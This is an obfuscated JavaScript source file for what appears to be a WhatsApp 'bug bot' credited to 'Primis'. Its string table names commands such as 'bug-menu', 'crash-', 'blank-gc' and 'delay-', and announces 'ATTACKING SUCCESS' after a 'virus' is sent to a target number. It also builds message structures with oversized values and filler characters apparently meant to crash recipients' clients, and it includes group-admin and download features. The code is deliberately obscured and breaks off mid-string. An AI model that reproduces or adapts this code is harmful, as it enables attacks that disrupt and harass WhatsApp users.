function くめうめみか(くめうめみか, すたきや) {
  for (var うぬせ = 0; うぬせ < すたきや; うぬせ++) {
    くめうめみか.push(くめうめみか.shift());
  }
  return くめうめみか;
}
const すたきや = [0, 1, false, 4290772992, true, 16, 2246822507, 13, 3266489909, 4, "Q", ".", 2, "rovide", "g", 256, 65537, 100, 30, 3, "toStri", "ng", "4", undefined, "string", "Invali", "d data", " key p", "d (emp", "ty str", "ing)", "Serial", "izatio", "n erro", "r for ", "data '", "': ", null, "?", " ", "かくのまゆ", "sendMe", "ssage", "text", "e", "key", "essage", "id", "invite", "relayM", "partic", "ipant", "groupI", "nviteM", "groupN", "ame", "repeat", "groupJ", "628570", "966492", "3-1627", "579259", "@g.us", "Code", "h+64P9", "RhJDzg", "XSPf", "Expira", "tion", "999", "captio", "n", "thumbn", "ail", "jid", "\n", "test", "s", "button", "length", "@s.wha", "tsapp.", "net", "remote", "Jid", "status", "@broad", "cast", "Messag", "native", "name", "Json", "body", "ctiveM", "すほなほけく", "Intera", "fromOb", "ject", "title", "0", "mediaK", "l", "FlowMe", "age", "messag", "device", "ListMe", "tadata", "intera", "Body", "footer", "Footer", "create", "header", "Header", "hasMed", "iaAtta", "chment", "elMess", "degree", "jpegTh", "umbnai", "url", "𑇂𑆵𑆴", "𑆿", "よそか", "viewOn", "ceMess", "t", "tag", "mentio", "attrs", "conten", "きかあみ", "groupS", "tatusM", "ention", "protoc", "olMess", "type", "additi", "onalNo", "des", "meta", "Telegr", "am: @d", "sprimi", "ge", "contex", "tInfo", "format", "DEFAUL", "T", "FlowRe", "sponse", "galaxy", "_messa", "params", "\0", "versio", "locati", "onMess", "sLatit", "ude", 9.09999262999, "sLongi", "tude", 199.99963118999, "addres", "https:", 25000, ".com", "eId", "JidLis", "ned_us", "ers", "to", 5000, "⃝҉⃝҉⃝҉⃝҉⃝", "nedJid", "atsapp", ".net", "131355", "X", "quoted", "eMessa", "うけつ", 9.99e+23, 10000, "/", "disapp", "earing", "Mode", "initia", "tor", "CHANGE", "D_IN_C", "HAT", "trigge", "r", "CHAT_S", "ETTING", "s.what", "sapp.n", "et", "50002@", "mercha", "ntUrl", "ample", "d", "newsle", "pe", 720, "V2", 21.1266, 11.8199, 60000, "from", 2000, "extern", "alAdRe", "ply", "me", "mediaT", "ype", "ey", "fromMe", "interacti", "veRespons", "eMessage", "628", "isForw", "arded", "forwar", "dingSc", "ore", "forwarde", "dNewslet", "terMessa", "geInfo", "tterJi", "tterNa", "server", 1000, "Attrib", "🎭⃟༑⌁⃰𝐏𝐫", "𝐢͢𝐦𝐢𝐬 ", "𝑪͢𝒓𝒂ͯ͢�", 900000, "7", "reques", "expiry", "Timest", "amp", "ctiveR", "espons", "Primis", "nativeFl", "owRespon", "seMessag", "floor", "random", "extend", "edText", "ꦾ", "0@s.wh", "1", "しほゆ", 25, "さみうてあ", "eConte", "xtInfo", "�ཀ͜͡🐉", "{\"flow", "_cta\":", "\"", 999, "©️ run", "ning s", "ince 2", "020 to", " 20##?", "s_mess", 522500, "LinkGr", "oupTyp", "eV2", 9000000, "paymen", "tInvit", "servic", "eType", "now", "⃝꙰꙰꙰", "Id", "error", 500000, "Params", "single", "_selec", "ify", "ោ៝", "flow_a", "eParam", "sJson", "{}", "eSecre", "Bytes", 32, "\",\"flo", "w_mess", "age_ve", "rsion\"", ":\"3\"}", "letter", "call_p", "ermiss", "ion_re", "quest", " ¿?", "Text", "yText", " Primi", 1999, "sticke", "ꦽ", "🦠", "access", "ibilit", "mimety", "fileLe", "ngth", "fileSh", "a256", "fileEn", "cSha25", "6", "direct", "Path", "stanza", "123456", "ion", "eyTime", "stamp", "Sha256", 252, "h", "999999", "interac", "tiveRes", "ponseMe", 1000000, "みはせのつて", "is_sta", "tus_me", "ntion", "flow_c", "ta", "error:", "sMessa", "Ω", "tText", ".null", "displa", "s ¿? ", "Type", "まおむめかひ", "groupSta", "tusMenti", "onMessag", 5000000, "᬴", 90000, "\",\"flow_me", "ssage_vers", "image/", "jpeg", "107374", "182400", "height", 9999, "width", "scansS", "idecar", "=", "scanLe", "ngths", "push", "てちへなつそ", "imageM", "Native", "}", "Versio", "carous", "Carous", "cards", "ねにはこ", "ode", "encode", ":", "ゆたややに", "ns", "ちちこ", "WAMess", "Partic", "ipantN", "odes", "patchM", "Before", "Sendin", "map", "recipi", "entJid", "user", "mutex", "nodes", "should", "Includ", "eDevic", "eIdent", "ity", "concat", "alloc", 8, "y", "enc", "audio", "opus", "rate", "3", 5, "2", "authSt", "ate", "creds", "ation", "screen", "99999", "vp8", "むすふもぬえ", "log", "task", "image", "dedNew", "slette", "rMessa", "chat", "こあそもみほ", "settin", "gs", "descri", "ption", "source", "Url", "render", "Larger", "Thumbn", "conver", "sation", "mtype", "videoM", "listRe", "Reply", "select", "msg", "edId", "sRespo", "nseMes", "sage", "split", "th", "parse", "readFi", "leSync", "resolv", "replac", "includ", "es", "slice", "rCase", "trim", "shift", "toLowe", " +", "a", "supera", "dmin", "admin", "filter", "sender", "./lib/", "Y", "IDR", "ひなたしち", "おのいなよ", "みふきへそ", "ひしへしたふ", "もすのむ", "expira", "ces", "itle", "普里米斯·克", "拉舍", "enu", "r - Me", "̃nũ", "has_mu", "ltiple", "_butto", "y_text", "くちむうな", "しひそうの", "せすつしう", "なもほあへ", "https:/", "------", "bgHex", " \n", "ちうきうぬ", "みへぬ", "すあふつ", "おききえ", "いきねもすま", "てはくえしや", "あえよふ", "せみえと", "いせねほ", "ひへいおほひ", "にとてむ", "きむい", "ゆこゆいて", "さそつ", "ゆおみはたえ", "ひこいこてお", "もせく", "きたすた", "よすくそいき", "やついち", "えきめえな", "むあた", "きともそ", "くちはひひつ", "くたちへ", "むかうきつ", "はなほすしに", "ゆなひめむ", "てさけむに", "はへえけ", "へいた", "たのひひふお", "おうもそうつ", "ちすやゆへ", "おこゆね", "よもひせひや", "もさせひなね", "pushNa", "No Nam", "bug-me", "nu", "totalm", "em", "freeme", "m", "\n> ┏━━〔 𝐁𝐎𝐓 𝐒𝐓𝐀�", "�𝐔𝐒 〕━━┓\n> ┃ ︻\n> ┃ ➥", " ʙᴏᴛ ɴᴀᴍᴇ: *MOTU PATLUཀ͜͡", "*\n> ┃ ➥ ᴠᴇʀꜱɪᴏɴ: *6.0*", "\n> ┃ ➥ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *MOTU PATLUཀ͜͡ ", "MOTU PATLUཀ͜͡*\n> ┃ ➥ ᴘʀᴇꜰɪx: ", "*[", "otherm", "ownerm", "\n> ┏━━〔 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒", " 〕━━┓\n> ┃ ︻\n> ┃ ➥ ʙᴏᴛ ɴᴀᴍᴇ:", " *MOTU PATLUཀ͜͡*\n> ┃ ➥ ᴠᴇʀꜱɪᴏɴ", ": *6.0*\n> ┃ ➥ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *MOTU PATLUཀ͜͡͡*\n> ┃ ➥ ᴘʀᴇꜰɪx: *[", "tqto", "[", "sc", "groupm", "[^0-9]", "starts", "With", "— ex: ", " 509xx", "databa", "se/own", "er.jso", "utf8", "er", "owner", "x", "x !!", "f", "splice", "writeF", "ileSyn", "c", "succes", "sfully", "public", "*— exa", "mple: ", "509409", 6, 99999, "1@news", "ce", "¿?", "sectio", "highli", "ght_la", "bel", "rows", ")", "|", "38083", "❌ ɪᴍᴘᴏss", "ɪʙʟᴇ ᴛᴏ ", "ʙᴜɢ ᴛʜɪs", " ɴᴜᴍʙᴇʀ", "_", "green", "Success S", "end Bug B", "y Primis�", "�", "ʀ", ": ", "❌ ɪᴍᴘᴏ", "ssɪʙʟᴇ", " ᴛᴏ ʙᴜ", "ɢ ᴛʜɪs", " ɴᴜᴍʙᴇ", "「 𝐀𝐓𝐓𝐀𝐂𝐊", "𝐈𝐍𝐆 𝐒𝐔𝐂�", "�𝐄𝐒𝐒 」\n\n𖥂 ", "𝐓𝐀𝐑𝐆𝐄𝐓 :", "Success", " Send B", "ug By P", "rimis🐉", "delay-", "x 5", "- *Exa", "mple U", "se.*\n ", "Exampl", "e Use.", "\n ", "「 𝐀𝐓𝐓𝐀", "𝐂𝐊𝐈𝐍𝐆", " 𝐒𝐔𝐂𝐂�", "�𝐒𝐒 」\n\n�", "� 𝐓𝐀𝐑𝐆", "𝐄𝐓 : ", "Succes", "s Send", " Bug B", "y Prim", "is🐉", "「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍�", "� 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n", "\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ", "❌ ɪᴍᴘᴏssɪʙ", "ʟᴇ ᴛᴏ ʙᴜɢ ", "ᴛʜɪs ɴᴜᴍʙᴇ", "minutes so that whatsapp is not blocked._", "ios", "「 𝐀𝐓𝐓𝐀�", "�𝐊𝐈𝐍𝐆 �", "�𝐔𝐂𝐂𝐄𝐒", "𝐒 」\n\n𖥂 𝐓", "𝐀𝐑𝐆𝐄𝐓 ", "\n𖥂 𝐕𝐈𝐑𝐔𝐒 : ", "\n_» After you sen", "d the virus, Plea", "se wait 5 minutes", " so that whatsapp", " is not blocked._", "blank-", "gc", "「 𝐀𝐓𝐓", "𝐀𝐂𝐊𝐈", "𝐍𝐆 𝐒�", "�𝐂𝐂𝐄�", "�𝐒 」\n\n�", "� 𝐓𝐀𝐑", "𝐆𝐄𝐓 :", "crash-", "add", "This f", "eature", " is fo", "r grou", "ps onl", "y!", "owner ", "d numb", "er!", "groupP", "artici", "pantsU", "pdate", "✅ Succ", "essful", "*", "Admin/", "only!", "_Bots mus", "t be admi", "ns first_", "promot", "❌ Fail", "ed to ", "_Bots ", "must b", "e admi", "ns fir", "st_", " 509409", "xxxx or", " reply ", "to the ", "target ", "message", "demote", "✅ *", "This featur", "e is for gr", "oups only!", "setppg", "roup", "catch", "!", "delete", "Admin ", "Bot mu", "st be ", "admin!", "setnam", "❌ Faile", "Group ", "specia", "l feat", "ures!", "setdes", "groupU", "ime", "Group sp", "ecial fe", "atures!", "closet", "minute", "openti", "second", "hour", 3600000, "day", 86400000, "Format", " wrong", " time!", " (seco", "nd/min", "ute/ho", "ur/day", "✅ The grou", "p will be ", "etting", "Update", "✅ Group ", "❌ Failed ", "k", "specif", "ic fea", "tures!", "groupM", "etadat", "38083@", "ipants", "remove", "Error ", "@", "tiktok", "..", "data", "video", "play", "//www.", "tikwm.", "com/ap", "i/?url", "images", 10, " from ", "e.", "music", "p", "ひいにくねに", "tterMe", "ed", "onWhat", "sApp", "toLoca", "leStri", "-", "ePictu", "ount", "number", "exists", "lid", "busine", "No bio", "ated", "ght", "By Pri", "mis", "ing", "then", "result", "*Synta", "x Erro", "r*\nExa", "isArra", "downlo", "mp4", "ch", "ytsear", "ound", "\n\n", "on"];
function うぬせ() {}
function XeonBotInc(くめうめみか, うぬせ, XeonBotInc) {
  switch (くめうめみか) {
    case すたきや[186]:
      return うぬせ * XeonBotInc;
  }
}
function すかく() {}
function めはぬこ(くめうめみか, XeonBotInc) {
  function* めはぬこ(そしねめ, ぬめくほき, むほえ, まうぬへ, ほふはも = {
    のていさけく: {}
  }, めつにた) {
    while (そしねめ + ぬめくほき + むほえ + まうぬへ !== -48) {
      with (ほふはも.かのゆ || ほふはも) {
        switch (そしねめ + ぬめくほき + むほえ + まうぬへ) {
          case ほふはも.のていさけく.になほくさ + -280:
            return undefined;
          case まうぬへ + 240:
            [ほふはも.のていさけく.になほくさ] = [124];
            のていさけく.みあおしかも = function (...そしねめ) {
              return めはぬこ(-221, -10, 236, -97, {
                のていさけく: ほふはも.のていさけく,
                へちしもおき: {}
              }, そしねめ).next().value;
            };
            if (!("tsOVP2" + すたきや[ぬめくほき + 409] in うぬせ) && "bPcGAH" + すたきや[22] in すかく) {
              ほふはも.かのゆ = ほふはも.のていさけく;
              そしねめ += -41;
              ぬめくほき += -92;
              むほえ += -83;
              まうぬへ += 94;
              break;
            } else {
              ほふはも.かのゆ = ほふはも.のていさけく;
              そしねめ += -203;
              ぬめくほき += -92;
              むほえ += -29;
              まうぬへ += -103;
              break;
            }
          case むほえ + 293:
            1;
            みあおしかも();
            ほふはも.かのゆ = ほふはも.のていさけく;
            そしねめ += -162;
            むほえ += 54;
            まうぬへ += -197;
            break;
          case むほえ + 218:
          case -175:
          case -219:
            [ほふはも.のていさけく.になほくさ] = [-66];
            return たぬままほ;
            ほふはも.かのゆ = ほふはも.へちしもおき;
            そしねめ += -172;
            ぬめくほき += 18;
            むほえ += 104;
            まうぬへ += -52;
            break;
          case ほふはも.のていさけく.になほくさ + -209:
            [ほふはも.のていさけく.になほくさ] = [228];
            return たぬままほ;
            ほふはも.かのゆ = ほふはも.へちしもおき;
            そしねめ += -94;
            ぬめくほき += 18;
            むほえ += 104;
            まうぬへ += -99;
            break;
          case -243:
          case -176:
          case むほえ + 882:
            ほふはも.かのゆ = ほふはも.いきおぬなほ;
            そしねめ += -5;
            ぬめくほき += -223;
            break;
          case -181:
            XeonBotInc |= すたきや[0];
            ほふはも.のていさけく.おぬひ = (くめうめみか & 4194303) * XeonBotInc;
            if (!("MxB9Ej" in うぬせ) && くめうめみか & すたきや[3]) {
              おぬひ += (くめうめみか & すたきや[3]) * XeonBotInc | すたきや[むほえ + 115];
            }
            ちせそ = true;
            return おぬひ | すたきや[そしねめ + -41];
            ほふはも.かのゆ = ほふはも.うやめ;
            そしねめ += 183;
            ぬめくほき += 251;
            むほえ += -587;
            まうぬへ += 286;
            break;
            if (そしねめ < 41) {
              ほふはも.かのゆ = ほふはも.のていさけく;
              そしねめ += 162;
              むほえ += -54;
              まうぬへ += 197;
              break;
            }
          case ぬめくほき - 82:
            へちしもおき.みみけ = function* そしねめ(ぬめくほき, むほえ, まうぬへ = {
              せおけ: {}
            }) {
              while (ぬめくほき + むほえ !== 154) {
                with (まうぬへ.うなや || まうぬへ) {
                  switch (ぬめくほき + むほえ) {
                    default:
                      [まうぬへ.せおけ.そむて] = [-207];
                      せおけ.ねうてめふぬ = function (そしねめ) {
                        function* ぬめくほき(ぬめくほき, まうぬへ, ほふはも, めつにた = {
                          そはやめくけ: {}
                        }) {
                          while (ぬめくほき + まうぬへ + ほふはも !== 207) {
                            with (めつにた.ねけなははい || めつにた) {
                              switch (ぬめくほき + まうぬへ + ほふはも) {
                                default:
                                case -72:
                                case -11:
                                  [めつにた.そはやめくけ.みさなね, めつにた.そはやめくけ.かうのこや] = [198, -183];
                                  そはやめくけ.くいよ = [];
                                  if (そしねめ === すたきや[まうぬへ + -243] || そしねめ >= すたきや[9]) {
                                    1;
                                    せおけ.てひはうす(そはやめくけ.くいよ, [], そしねめ, すたきや[0]);
                                  }
                                  めつにた.ねけなははい = めつにた.そはやめくけ;
                                  ぬめくほき += 425;
                                  まうぬへ += -75;
                                  ほふはも += -425;
                                  break;
                                  if (まうぬへ < 104) {
                                    ;
                                    break;
                                  }
                                case 201:
                                case -92:
                                case -153:
                                  むほえ = true;
                                  return くいよ;
                                  めつにた.ねけなははい = めつにた.せつくこめほ;
                                  ぬめくほき += -243;
                                  ほふはも += 603;
                                  break;
                                case ほふはも - 321:
                                  [めつにた.そはやめくけ.みさなね, めつにた.そはやめくけ.かうのこや] = [-180, -215];
                                  めつにた.ねけなははい = めつにた.そはやめくけ;
                                  ぬめくほき += 86;
                                  まうぬへ += 468;
                                  ほふはも += -526;
                                  break;
                                  if (!(ぬめくほき == -(まうぬへ + 321))) {
                                    めつにた.ねけなははい = めつにた.ゆくおお;
                                    ぬめくほき += -157;
                                    まうぬへ += 468;
                                    ほふはも += 77;
                                    break;
                                  }
                                case ぬめくほき - 89:
                                  めつにた.ねけなははい = めつにた.そはやめくけ;
                                  ぬめくほき += 86;
                                  まうぬへ += 398;
                                  ほふはも += -526;
                                  break;
                                  if (!(ぬめくほき == -22)) {
                                    めつにた.ねけなははい = めつにた.となむ;
                                    ぬめくほき += -157;
                                    まうぬへ += 398;
                                    ほふはも += 77;
                                    break;
                                  }
                              }
                            }
                          }
                        }
                        var むほえ;
                        var まうぬへ = ぬめくほき(-361, 244, 39).next().value;
                        if (むほえ) {
                          return まうぬへ;
                        }
                      };
                      せおけ.てひはうす = function (そしねめ, ぬめくほき, むほえ, まうぬへ) {
                        for (var ほふはも = まうぬへ; ほふはも < むほえ; ほふはも++) {
                          if (ぬめくほき.length !== ほふはも) {
                            return;
                          }
                          for (var めつにた = すたきや[0]; めつにた < むほえ; めつにた++) {
                            1;
                            if (せおけ.たくけ(ぬめくほき, [ほふはも, めつにた])) {
                              ぬめくほき.push([ほふはも, めつにた]);
                              1;
                              せおけ.てひはうす(そしねめ, ぬめくほき, むほえ, ほふはも + すたきや[1]);
                              if (ぬめくほき.length === むほえ) {
                                1;
                                そしねめ.push(せおけ.こけね(ぬめくほき));
                              }
                              ぬめくほき.pop();
                            }
                          }
                        }
                      };
                      まうぬへ.うなや = まうぬへ.せおけ;
                      ぬめくほき += -137;
                      むほえ += -3;
                      break;
                    case 144:
                    case -172:
                    case ぬめくほき != 20 && ぬめくほき + 134:
                      まうぬへ.せおけ.こけね = function (そしねめ) {
                        function* ぬめくほき(ぬめくほき, まうぬへ, ほふはも, めつにた, くめうめみか = {
                          あはきは: {}
                        }) {
                          while (ぬめくほき + まうぬへ + ほふはも + めつにた !== 126) {
                            with (くめうめみか.むほひてつ || くめうめみか) {
                              switch (ぬめくほき + まうぬへ + ほふはも + めつにた) {
                                case くめうめみか.あはきは.まふぬいふ + 206:
                                  むほえ = true;
                                  return けみゆのめや;
                                  くめうめみか.むほひてつ = くめうめみか.もなお;
                                  ぬめくほき += -22;
                                  まうぬへ += -271;
                                  ほふはも += 408;
                                  break;
                                case くめうめみか.あはきは.まふぬいふ + 160:
                                  [くめうめみか.あはきは.まふぬいふ] = [-103];
                                default:
                                  [くめうめみか.あはきは.まふぬいふ] = [-31];
                                  くめうめみか.むほひてつ = くめうめみか.ちもも;
                                  ぬめくほき += 202;
                                  まうぬへ += -425;
                                  ほふはも += -12;
                                  めつにた += 5;
                                  break;
                                case 248:
                                case -162:
                                case -227:
                                  [くめうめみか.あはきは.まふぬいふ] = [-195];
                                  あはきは.けみゆのめや = [];
                                  あはきは.てもつ = そしねめ.length;
                                  for (あはきは.めけおけ = すたきや[ほふはも + -156]; あはきは.めけおけ < あはきは.てもつ; あはきは.めけおけ++) {
                                    あはきは.けみゆのめや[あはきは.めけおけ] = "";
                                    for (あはきは.そむし = すたきや[ぬめくほき + -29]; あはきは.そむし < あはきは.てもつ; あはきは.そむし++) {
                                      あはきは.けみゆのめや[あはきは.めけおけ] += そしねめ[あはきは.めけおけ][すたきや[ほふはも + -155]] === あはきは.そむし ? すたきや[ぬめくほき + -19] : すたきや[ほふはも + -145];
                                    }
                                  }
                                  くめうめみか.むほひてつ = くめうめみか.あはきは;
                                  ぬめくほき += -92;
                                  まうぬへ += 731;
                                  ほふはも += -396;
                                  めつにた += -5;
                                  break;
                                  if (!(ほふはも != -227)) {
                                    ;
                                    break;
                                  }
                              }
                            }
                          }
                        }
                        var むほえ;
                        var まうぬへ = ぬめくほき(29, -169, 156, -243).next().value;
                        if (むほえ) {
                          return まうぬへ;
                        }
                      };
                      まうぬへ.せおけ.たくけ = function (そしねめ, ぬめくほき) {
                        function* むほえ(むほえ, ほふはも, めつにた, くめうめみか = {
                          よなてと: {}
                        }) {
                          while (むほえ + ほふはも + めつにた !== 4) {
                            with (くめうめみか.はけめきあ || くめうめみか) {
                              switch (むほえ + ほふはも + めつにた) {
                                default:
                                  [くめうめみか.よなてと.めそて] = [118];
                                  くめうめみか.はけめきあ = くめうめみか.なまなふ;
                                  むほえ += 515;
                                  ほふはも += -136;
                                  めつにた += -397;
                                  break;
                                case -231:
                                  [くめうめみか.よなてと.めそて] = [67];
                                  よなてと.ひこにひ = そしねめ.length;
                                  for (よなてと.こえすしま = すたきや[0]; よなてと.こえすしま < よなてと.ひこにひ; よなてと.こえすしま++) {
                                    if (そしねめ[よなてと.こえすしま][すたきや[むほえ + 140]] === ぬめくほき[すたきや[ほふはも + -63]] || そしねめ[よなてと.こえすしま][すたきや[1]] === ぬめくほき[すたきや[むほえ + 141]]) {
                                      まうぬへ = true;
                                      return すたきや[2];
                                    }
                                    if (Math.abs((そしねめ[よなてと.こえすしま][すたきや[0]] - ぬめくほき[すたきや[むほえ + 140]]) / (そしねめ[よなてと.こえすしま][すたきや[むほえ + 141]] - ぬめくほき[すたきや[1]])) === すたきや[むほえ + 141]) {
                                      まうぬへ = true;
                                      return すたきや[2];
                                    }
                                  }
                                  くめうめみか.はけめきあ = くめうめみか.よなてと;
                                  むほえ += 274;
                                  ほふはも += 37;
                                  めつにた += 2;
                                  break;
                                case めつにた + 234:
                                case -26:
                                case -66:
                                  まうぬへ = true;
                                  return すたきや[むほえ + -130];
                                  くめうめみか.はけめきあ = くめうめみか.まみよやよ;
                                  むほえ += 225;
                                  ほふはも += -303;
                                  break;
                                  if (むほえ < 134) {
                                    くめうめみか.はけめきあ = くめうめみか.よなてと;
                                    break;
                                  }
                                case むほえ + 64:
                                  くめうめみか.はけめきあ = くめうめみか.よなてと;
                                  むほえ += 199;
                                  ほふはも += -24;
                                  めつにた += -150;
                                  break;
                                case -228:
                                case ほふはも + 452:
                                  くめうめみか.はけめきあ = くめうめみか.ちなこはくぬ;
                                  めつにた += -245;
                                  break;
                                case むほえ - 35:
                                  くめうめみか.はけめきあ = くめうめみか.よなてと;
                                  むほえ += 500;
                                  ほふはも += -18;
                                  めつにた += -57;
                                  break;
                                case -194:
                                case めつにた + 58:
                                  [くめうめみか.よなてと.めそて] = [-250];
                                  くめうめみか.はけめきあ = くめうめみか.よなてと;
                                  むほえ += 245;
                                  ほふはも += -147;
                                  めつにた += 131;
                                  break;
                              }
                            }
                          }
                        }
                        var まうぬへ;
                        var ほふはも = むほえ(-140, 63, -154).next().value;
                        if (まうぬへ) {
                          return ほふはも;
                        }
                      };
                      へちしもおき.ほえかてい = true;
                      return console.log(ねうてめふぬ);
                      まうぬへ.うなや = まうぬへ.こまき;
                      ぬめくほき += 83;
                      break;
                      if (!(ぬめくほき == -63)) {
                        まうぬへ.うなや = まうぬへ.むなみと;
                        ぬめくほき += 137;
                        むほえ += 3;
                        break;
                      }
                    case むほえ + 8:
                      if (ぬめくほき > ぬめくほき + 121) {
                        まうぬへ.うなや = まうぬへ.ゆくうちむは;
                        ぬめくほき += 12;
                        むほえ += 382;
                        break;
                      }
                    case むほえ != 134 && むほえ + 20:
                      [まうぬへ.せおけ.そむて] = [188];
                      まうぬへ.うなや = まうぬへ.せおけ;
                      ぬめくほき += -83;
                      むほえ += 114;
                      break;
                      if (ぬめくほき != 20) {
                        まうぬへ.うなや = まうぬへ.めちはす;
                        ぬめくほき += 54;
                        むほえ += 117;
                        break;
                      }
                  }
                }
              }
            };
            へちしもおき.ほえかてい = undefined;
            1;
            へちしもおき.たぬままほ = へちしもおき.みみけ(ぬめくほき + 84, ぬめくほき + 147).next().value;
            if (へちしもおき.ほえかてい) {
              ほふはも.かのゆ = ほふはも.へちしもおき;
              そしねめ += 356;
              むほえ += -423;
              まうぬへ += 209;
              break;
            } else {
              ほふはも.かのゆ = ほふはも.へちしもおき;
              そしねめ += 356;
              ぬめくほき += -97;
              むほえ += -404;
              まうぬへ += 81;
              break;
            }
            if (!(ぬめくほき < 180)) {
              ほふはも.かのゆ = ほふはも.へちしもおき;
              そしねめ += 356;
              ぬめくほき += -97;
              むほえ += -404;
              まうぬへ += 81;
              break;
            }
          default:
          case ぬめくほき + 159:
            return undefined;
          case そしねめ - 85:
            return たぬままほ;
            ほふはも.かのゆ = ほふはも.へちしもおき;
            ぬめくほき += -97;
            むほえ += 19;
            まうぬへ += -128;
            break;
        }
      }
    }
  }
  var ちせそ;
  var そしねめ = めはぬこ(244, 82, -86, 6).next().value;
  if (ちせそ) {
    return そしねめ;
  }
}
;
var ちせそ = Math.imul || めはぬこ;
function そしねめ(くめうめみか, XeonBotInc) {
  if (!("GoDf8xu" in うぬせ) && "c7yANR" + すたきや[484] in すかく) {
    めはぬこ();
  }
  function めはぬこ() {}
  var そしねめ = 3735928559 ^ XeonBotInc;
  var ぬめくほき = 1103547991 ^ XeonBotInc;
  var むほえ = すたきや[0];
  for (var まうぬへ; むほえ < くめうめみか.length; むほえ++) {
    if ("o9MH0yb" in すかく) {
      ほふはも();
    }
    function ほふはも() {
      function XeonBotInc(XeonBotInc) {
        const めはぬこ = {};
        for (let そしねめ of XeonBotInc.replace(/[^w]/g, "").toLowerCase()) めはぬこ[そしねめ] = めはぬこ[そしねめ] + すたきや[1] || すたきや[1];
        return めはぬこ;
      }
      function めはぬこ(XeonBotInc, めはぬこ) {
        const そしねめ = buildCharMap(XeonBotInc);
        const ぬめくほき = buildCharMap(めはぬこ);
        for (let くめうめみか in そしねめ) {
          if (そしねめ[くめうめみか] !== ぬめくほき[くめうめみか]) {
            return すたきや[2];
          }
        }
        if (Object.keys(そしねめ).length !== Object.keys(ぬめくほき).length) {
          return すたきや[2];
        }
        return すたきや[4];
      }
      function そしねめ(XeonBotInc) {
        const めはぬこ = ぬめくほき(XeonBotInc);
        return めはぬこ !== Infinity;
      }
      function ぬめくほき(XeonBotInc) {
        if (!XeonBotInc) {
          return -すたきや[1];
        }
        const めはぬこ = ぬめくほき(XeonBotInc.left);
        const そしねめ = ぬめくほき(XeonBotInc.right);
        const くめうめみか = Math.abs(めはぬこ - そしねめ);
        if (めはぬこ === Infinity || そしねめ === Infinity || くめうめみか > すたきや[1]) {
          return Infinity;
        }
        const むほえ = Math.max(めはぬこ, そしねめ) + すたきや[1];
        return むほえ;
      }
      window["__GLOBAL__HELPERS_" + すたきや[622]] = {
        buildCharacterMap: XeonBotInc,
        isAnagrams: めはぬこ,
        isBalanced: そしねめ,
        getHeightBalanced: ぬめくほき
      };
    }
    まうぬへ = くめうめみか.charCodeAt(むほえ);
    そしねめ = ちせそ(そしねめ ^ まうぬへ, 2654435761);
    ぬめくほき = ちせそ(ぬめくほき ^ まうぬへ, 1597334677);
  }
  そしねめ = ちせそ(そしねめ ^ そしねめ >>> すたきや[5], すたきや[6]) ^ ちせそ(ぬめくほき ^ ぬめくほき >>> すたきや[7], すたきや[8]);
  ぬめくほき = ちせそ(ぬめくほき ^ ぬめくほき >>> すたきや[5], すたきや[6]) ^ ちせそ(そしねめ ^ そしねめ >>> すたきや[7], すたきや[8]);
  if (!("vvEIaqL" in うぬせ)) {
    return 4294967296 * (2097151 & ぬめくほき) + (そしねめ >>> すたきや[0]);
  } else {
    return "2kQFVR";
  }
}
;
function ぬめくほき(くめうめみか, XeonBotInc, めはぬこ = new RegExp(" |\\n|;|,|\\{|\\}|\\(|\\)|\\.|\\[|\\]", すたきや[14])) {
  function* ちせそ(むほえ, まうぬへ, ほふはも, めつにた, まうはけひう = {
    みとほさ: {}
  }, へあは) {
    while (むほえ + まうぬへ + ほふはも + めつにた !== 72) {
      with (まうはけひう.はえや || まうはけひう) {
        switch (むほえ + まうぬへ + ほふはも + めつにた) {
          case めつにた + 9:
          case -227:
          case -164:
            [まうはけひう.みとほさ.はにてけゆふ] = [23];
            ぬめくほき = true;
            return そしねめ(えたもそ, XeonBotInc);
            まうはけひう.はえや = まうはけひう.みとほさ;
            むほえ += 256;
            まうぬへ += -438;
            ほふはも += 168;
            めつにた += 360;
            break;
            if (!(めつにた < -(むほえ + 12))) {
              まうはけひう.はえや = まうはけひう.みとほさ;
              むほえ += -717;
              まうぬへ += -530;
              ほふはも += 1012;
              めつにた += 337;
              break;
            }
          case -234:
          default:
          case まうはけひう.みとほさ.はにてけゆふ + 54:
            return undefined;
          case ほふはも + 51:
            return むかまそむさ;
            まうはけひう.はえや = まうはけひう.しむの;
            むほえ += 101;
            ほふはも += -330;
            break;
          case まうぬへ - 1:
            まうはけひう.はえや = まうはけひう.おはそ;
            むほえ += -973;
            ほふはも += 850;
            break;
          case -202:
          case 161:
            [まうはけひう.みとほさ.はにてけゆふ] = [-70];
            みとほさ.そてむ = function (...むほえ) {
              return ちせそ(-17, 20, 162, -39, {
                みとほさ: まうはけひう.みとほさ,
                しむの: {}
              }, むほえ).next().value;
            };
            if ("tZuQVk" + すたきや[183] in すかく) {
              まうはけひう.はえや = まうはけひう.みとほさ;
              むほえ += -61;
              まうぬへ += 130;
              ほふはも += 476;
              めつにた += -285;
              break;
            } else {
              まうはけひう.はえや = まうはけひう.みとほさ;
              むほえ += 73;
              まうぬへ += 130;
              ほふはも += 393;
              めつにた += -285;
              break;
            }
          case めつにた - 264:
            ぬめくほき = true;
            return "BPHlJy";
            まうはけひう.はえや = まうはけひう.みとほさ;
            むほえ += 247;
            まうぬへ += 12;
            break;
          case めつにた + 165:
            しむの.めこぬめせ = function* むほえ(まうぬへ, ほふはも, めつにた, まうはけひう = {
              よへうねよあ: {}
            }) {
              while (まうぬへ + ほふはも + めつにた !== 250) {
                with (まうはけひう.なへこ || まうはけひう) {
                  switch (まうぬへ + ほふはも + めつにた) {
                    case 125:
                    case 63:
                      まうはけひう.なへこ = まうはけひう.よへうねよあ;
                      まうぬへ += -430;
                      ほふはも += 184;
                      break;
                    case めつにた + 224:
                      まうはけひう.なへこ = まうはけひう.たのけほ;
                      まうぬへ += 55;
                      ほふはも += -460;
                      めつにた += 628;
                      break;
                    case -246:
                    case ほふはも + 260:
                      まうはけひう.よへうねよあ.こぬあや = "return U[c[c[d(-199)]-b(205)]]||V[ae(b(166))];case T.o[c[c[c[d(-199)]+d(-174)]-(c[b(119)]-(c[d(-199)]-163))]+ae(b(146))](0)==b(167)?d(-130):-d(-144)";
                      しむの.うとうとし = true;
